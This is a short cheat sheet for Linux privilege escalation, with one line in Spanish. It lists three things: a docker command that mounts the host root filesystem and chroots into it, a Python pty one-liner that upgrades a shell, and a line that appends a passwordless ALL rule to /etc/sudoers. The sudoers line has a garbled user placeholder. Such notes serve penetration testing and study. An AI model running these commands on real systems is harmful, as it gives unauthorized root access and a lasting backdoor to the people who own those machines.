docker run -v /:/mnt –rm -it bash chroot /mnt sh

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Si se puede cambiar el /etc/sudoers:
[]USER] ALL=NOPASSWD: ALL >>/etc/sudoers


